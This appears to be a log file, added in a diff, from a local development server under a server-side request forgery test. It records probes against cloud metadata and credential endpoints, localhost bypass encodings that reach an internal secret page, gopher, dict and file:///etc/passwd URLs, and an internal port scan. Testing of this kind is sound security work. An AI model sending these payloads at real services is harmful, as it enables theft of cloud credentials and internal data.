@@ -1,0 +1,87 @@
+2026-10-17 19:02:24,583 | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:8000
+2026-10-17 19:02:24,585 | [33mPress CTRL+C to quit[0m
+2026-10-17 19:02:53,643 | SSRF_ATTEMPT url=http://127.0.0.1:8000/internal/secret from=127.0.0.1
+2026-10-17 19:02:53,660 | 127.0.0.1 - - [17/Oct/2026 19:02:53] "GET /internal/secret HTTP/1.1" 200 -
+2026-10-17 19:02:53,669 | 127.0.0.1 - - [17/Oct/2026 19:02:53] "GET /fetch?url=http://127.0.0.1:8000/internal/secret HTTP/1.1" 200 -
+2026-10-17 19:02:53,676 | SSRF_ATTEMPT url=http://10.255.255.1:81/ from=127.0.0.1
+2026-10-17 19:03:01,695 | 127.0.0.1 - - [17/Oct/2026 19:03:01] "[35m[1mGET /fetch?url=http://10.255.255.1:81/ HTTP/1.1[0m" 504 -
+2026-10-17 19:03:01,701 | SSRF_ATTEMPT url=http://nonexistent-host-xyz.invalid/ from=127.0.0.1
+2026-10-17 19:03:03,794 | 127.0.0.1 - - [17/Oct/2026 19:03:03] "[35m[1mGET /fetch?url=http://nonexistent-host-xyz.invalid/ HTTP/1.1[0m" 502 -
+2026-10-17 19:03:03,799 | SSRF_ATTEMPT url=http://127.0.0.1:9999/ssrf-callback from=127.0.0.1
+2026-10-17 19:03:03,812 | 127.0.0.1 - - [17/Oct/2026 19:03:03] "GET /fetch?url=http://127.0.0.1:9999/ssrf-callback HTTP/1.1" 200 -
+2026-10-17 19:03:04,908 | SSRF_ATTEMPT url=http://169.254.169.254/latest/meta-data/ from=127.0.0.1
+2026-10-17 19:03:12,918 | 127.0.0.1 - - [17/Oct/2026 19:03:12] "[35m[1mGET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1[0m" 504 -
+2026-10-17 19:03:12,926 | SSRF_ATTEMPT url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ from=127.0.0.1
+2026-10-17 19:03:20,941 | 127.0.0.1 - - [17/Oct/2026 19:03:20] "[35m[1mGET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1[0m" 504 -
+2026-10-17 19:03:20,975 | SSRF_ATTEMPT url=http://169.254.169.254/latest/user-data/ from=127.0.0.1
+2026-10-17 19:03:27,745 | 127.0.0.1 - - [17/Oct/2026 19:03:27] "[35m[1mGET /fetch?url=http://169.254.169.254/latest/user-data/ HTTP/1.1[0m" 504 -
+2026-10-17 19:03:27,755 | SSRF_ATTEMPT url=http://metadata.google.internal/computeMetadata/v1/ from=127.0.0.1
+2026-10-17 19:03:28,859 | 127.0.0.1 - - [17/Oct/2026 19:03:28] "[35m[1mGET /fetch?url=http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1[0m" 502 -
+2026-10-17 19:03:28,882 | SSRF_ATTEMPT url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 from=127.0.0.1
+2026-10-17 19:03:36,913 | 127.0.0.1 - - [17/Oct/2026 19:03:36] "[35m[1mGET /fetch?url=http://169.254.169.254/metadata/instance?api-version%3D2021-02-01 HTTP/1.1[0m" 504 -
+2026-10-17 19:03:36,920 | SSRF_ATTEMPT url=http://169.254.169.254/metadata/v1/ from=127.0.0.1
+2026-10-17 19:03:44,947 | 127.0.0.1 - - [17/Oct/2026 19:03:44] "[35m[1mGET /fetch?url=http://169.254.169.254/metadata/v1/ HTTP/1.1[0m" 504 -
+2026-10-17 19:03:44,954 | SSRF_ATTEMPT url=http://100.100.100.200/latest/meta-data/ from=127.0.0.1
+2026-10-17 19:03:52,976 | 127.0.0.1 - - [17/Oct/2026 19:03:52] "[35m[1mGET /fetch?url=http://100.100.100.200/latest/meta-data/ HTTP/1.1[0m" 504 -
+2026-10-17 19:03:52,984 | SSRF_ATTEMPT url=http://169.254.169.254/opc/v1/instance/ from=127.0.0.1
+2026-10-17 19:04:00,999 | 127.0.0.1 - - [17/Oct/2026 19:04:00] "[35m[1mGET /fetch?url=http://169.254.169.254/opc/v1/instance/ HTTP/1.1[0m" 504 -
+2026-10-17 19:04:01,006 | SSRF_ATTEMPT url=http://2130706433:8000/internal/secret from=127.0.0.1
+2026-10-17 19:04:01,011 | 127.0.0.1 - - [17/Oct/2026 19:04:01] "GET /internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:01,017 | 127.0.0.1 - - [17/Oct/2026 19:04:01] "GET /fetch?url=http://2130706433:8000/internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:01,024 | SSRF_ATTEMPT url=http://0177.0.0.1:8000/internal/secret from=127.0.0.1
+2026-10-17 19:04:01,029 | 127.0.0.1 - - [17/Oct/2026 19:04:01] "GET /internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:01,032 | 127.0.0.1 - - [17/Oct/2026 19:04:01] "GET /fetch?url=http://0177.0.0.1:8000/internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:01,043 | SSRF_ATTEMPT url=http://0x7f.0.0.1:8000/internal/secret from=127.0.0.1
+2026-10-17 19:04:01,049 | 127.0.0.1 - - [17/Oct/2026 19:04:01] "GET /internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:01,050 | 127.0.0.1 - - [17/Oct/2026 19:04:01] "GET /fetch?url=http://0x7f.0.0.1:8000/internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:01,054 | SSRF_ATTEMPT url=http://127.1:8000/internal/secret from=127.0.0.1
+2026-10-17 19:04:01,057 | 127.0.0.1 - - [17/Oct/2026 19:04:01] "GET /internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:01,059 | 127.0.0.1 - - [17/Oct/2026 19:04:01] "GET /fetch?url=http://127.1:8000/internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:01,063 | SSRF_ATTEMPT url=http://[::1]:8000/internal/secret from=127.0.0.1
+2026-10-17 19:04:01,068 | 127.0.0.1 - - [17/Oct/2026 19:04:01] "[35m[1mGET /fetch?url=http://[::1]:8000/internal/secret HTTP/1.1[0m" 502 -
+2026-10-17 19:04:01,072 | SSRF_ATTEMPT url=http://[::ffff:127.0.0.1]:8000/internal/secret from=127.0.0.1
+2026-10-17 19:04:01,087 | 127.0.0.1 - - [17/Oct/2026 19:04:01] "GET /internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:01,089 | 127.0.0.1 - - [17/Oct/2026 19:04:01] "GET /fetch?url=http://[::ffff:127.0.0.1]:8000/internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:01,093 | SSRF_ATTEMPT url=http://127.0.0.1:8000@example.com/internal/secret from=127.0.0.1
+2026-10-17 19:04:04,481 | 127.0.0.1 - - [17/Oct/2026 19:04:04] "GET /fetch?url=http://127.0.0.1:8000@example.com/internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:04,486 | SSRF_ATTEMPT url=http://127.0.0.1.nip.io:8000/internal/secret from=127.0.0.1
+2026-10-17 19:04:05,298 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "GET /internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:05,300 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "GET /fetch?url=http://127.0.0.1.nip.io:8000/internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:05,306 | SSRF_ATTEMPT url=http://127.0.0.1:8000/redirect?to=http://127.0.0.1:8000/internal/secret from=127.0.0.1
+2026-10-17 19:04:05,319 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "[32mGET /redirect?to=http://127.0.0.1:8000/internal/secret HTTP/1.1[0m" 302 -
+2026-10-17 19:04:05,325 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "GET /internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:05,327 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "GET /fetch?url=http://127.0.0.1:8000/redirect?to%3Dhttp://127.0.0.1:8000/internal/secret HTTP/1.1" 200 -
+2026-10-17 19:04:05,333 | SSRF_ATTEMPT url=gopher://127.0.0.1:6379/_INFO from=127.0.0.1
+2026-10-17 19:04:05,336 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "[35m[1mGET /fetch?url=gopher://127.0.0.1:6379/_INFO HTTP/1.1[0m" 500 -
+2026-10-17 19:04:05,340 | SSRF_ATTEMPT url=dict://127.0.0.1:6379/INFO from=127.0.0.1
+2026-10-17 19:04:05,342 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "[35m[1mGET /fetch?url=dict://127.0.0.1:6379/INFO HTTP/1.1[0m" 500 -
+2026-10-17 19:04:05,346 | SSRF_ATTEMPT url=file:///etc/passwd from=127.0.0.1
+2026-10-17 19:04:05,348 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "[35m[1mGET /fetch?url=file:///etc/passwd HTTP/1.1[0m" 500 -
+2026-10-17 19:04:05,355 | SSRF_ATTEMPT url=ftp://127.0.0.1:21/ from=127.0.0.1
+2026-10-17 19:04:05,358 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "[35m[1mGET /fetch?url=ftp://127.0.0.1:21/ HTTP/1.1[0m" 500 -
+2026-10-17 19:04:05,363 | SSRF_ATTEMPT url=http://127.0.0.1:22/ from=127.0.0.1
+2026-10-17 19:04:05,369 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "[35m[1mGET /fetch?url=http://127.0.0.1:22/ HTTP/1.1[0m" 502 -
+2026-10-17 19:04:05,374 | SSRF_ATTEMPT url=http://127.0.0.1:80/ from=127.0.0.1
+2026-10-17 19:04:05,444 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "GET /fetch?url=http://127.0.0.1:80/ HTTP/1.1" 200 -
+2026-10-17 19:04:05,448 | SSRF_ATTEMPT url=http://127.0.0.1:443/ from=127.0.0.1
+2026-10-17 19:04:05,450 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "[35m[1mGET /fetch?url=http://127.0.0.1:443/ HTTP/1.1[0m" 502 -
+2026-10-17 19:04:05,453 | SSRF_ATTEMPT url=http://127.0.0.1:3306/ from=127.0.0.1
+2026-10-17 19:04:05,455 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "[35m[1mGET /fetch?url=http://127.0.0.1:3306/ HTTP/1.1[0m" 502 -
+2026-10-17 19:04:05,460 | SSRF_ATTEMPT url=http://127.0.0.1:5432/ from=127.0.0.1
+2026-10-17 19:04:05,468 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "[35m[1mGET /fetch?url=http://127.0.0.1:5432/ HTTP/1.1[0m" 502 -
+2026-10-17 19:04:05,472 | SSRF_ATTEMPT url=http://127.0.0.1:6379/ from=127.0.0.1
+2026-10-17 19:04:05,477 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "[35m[1mGET /fetch?url=http://127.0.0.1:6379/ HTTP/1.1[0m" 502 -
+2026-10-17 19:04:05,485 | SSRF_ATTEMPT url=http://127.0.0.1:8000/ from=127.0.0.1
+2026-10-17 19:04:05,490 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "GET / HTTP/1.1" 200 -
+2026-10-17 19:04:05,492 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "GET /fetch?url=http://127.0.0.1:8000/ HTTP/1.1" 200 -
+2026-10-17 19:04:05,496 | SSRF_ATTEMPT url=http://127.0.0.1:8080/ from=127.0.0.1
+2026-10-17 19:04:05,499 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "[35m[1mGET /fetch?url=http://127.0.0.1:8080/ HTTP/1.1[0m" 502 -
+2026-10-17 19:04:05,503 | SSRF_ATTEMPT url=http://127.0.0.1:8443/ from=127.0.0.1
+2026-10-17 19:04:05,508 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "[35m[1mGET /fetch?url=http://127.0.0.1:8443/ HTTP/1.1[0m" 502 -
+2026-10-17 19:04:05,511 | SSRF_ATTEMPT url=http://127.0.0.1:9200/ from=127.0.0.1
+2026-10-17 19:04:05,514 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "[35m[1mGET /fetch?url=http://127.0.0.1:9200/ HTTP/1.1[0m" 502 -
+2026-10-17 19:04:05,520 | SSRF_ATTEMPT url=http://127.0.0.1:27017/ from=127.0.0.1
+2026-10-17 19:04:05,523 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "[35m[1mGET /fetch?url=http://127.0.0.1:27017/ HTTP/1.1[0m" 502 -
+2026-10-17 19:04:05,526 | SSRF_ATTEMPT url=http://127.0.0.1:9999/ from=127.0.0.1
+2026-10-17 19:04:05,545 | 127.0.0.1 - - [17/Oct/2026 19:04:05] "GET /fetch?url=http://127.0.0.1:9999/ HTTP/1.1" 200 -
